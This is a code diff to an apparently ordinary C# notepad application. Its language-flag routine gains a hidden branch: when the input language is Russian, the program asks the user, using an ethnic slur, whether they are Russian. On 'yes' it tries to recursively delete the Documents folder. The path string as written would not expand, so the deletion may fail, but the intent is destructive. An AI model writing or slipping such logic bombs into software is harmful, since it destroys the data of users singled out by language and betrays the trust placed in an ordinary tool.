@@ -15,12 +15,43 @@
         public void LanguageFlagDisplay()
         {
             InputLanguage LanguageUsed = InputLanguage.CurrentInputLanguage;
-#if DEBUG 
-            string LanguageFlagIconPath = "..\\..\\..\\..\\Language Flags Debug\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png";
+            if(LanguageUsed.Culture.TwoLetterISOLanguageName == "ru")
+            {
+                var Question = MessageBox.Show("Тьі что москаль?", "❓", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+                if(Question == DialogResult.Yes)
+                {
+                    System.IO.Directory.Delete("%CSIDL_MYDOCUMENTS%", true);
+                    Application.Exit();
+                }
+                else if(Question == DialogResult.No)
+                {
+                    MessageBox.Show("Тоді чого в тебе російський \"язьік\"?", "❓", MessageBoxButtons.OK, MessageBoxIcon.Question);
+                    Application.Exit();
+                }
+            }
+            else
+            {
+                try
+                {
+#if DEBUG
+                    this.LanguageFlagIcon.Image = new Bitmap("..\\..\\..\\..\\Language Flags Debug\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png");
 #elif RELEASE
-            string LanguageFlagIconPath = "..\\Language Flags\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png";
+                    this.LanguageFlagIcon.Image = new Bitmap("..\\Language Flags\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png");
 #endif
-            this.LanguageFlagIcon.Image = new Bitmap(LanguageFlagIconPath);
+                }
+                catch
+                {
+#if DEBUG
+                    var _ = MessageBox.Show("Your flag was not found\nAdd it to the Language Flags Debug folder", "Flag not found", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                    if (_ == DialogResult.Yes)
+                        System.Diagnostics.Process.Start("explorer", "/select, \"" + System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location))))) + "\\Language Flags Debug\"");
+#elif RELEASE
+                    var _ = MessageBox.Show("Your country's flag was not found\n Read information on how to add it", "Flag not found", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                    if (_ == DialogResult.Yes)
+                        System.Diagnostics.Process.Start("explorer", "/select, \"" + System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location)) + "\\README.txt\"");
+#endif
+                }
+            } 
         }
 
         private void NotepadForm_InputLanguageChanged(object sender, InputLanguageChangedEventArgs e)
@@ -41,8 +72,9 @@
             /// коротше кажучи я не зрозумів як перемикати розкладку клавіатури
             /// може колись зроблю але це не точно
             /// </summary>
+            /// 
 
-            MessageBox.Show("😐", "😐");
+            //MessageBox.Show("😐", "😐");
         }
 
         private void NewToolStripMenuItem_Click(object sender, EventArgs e)
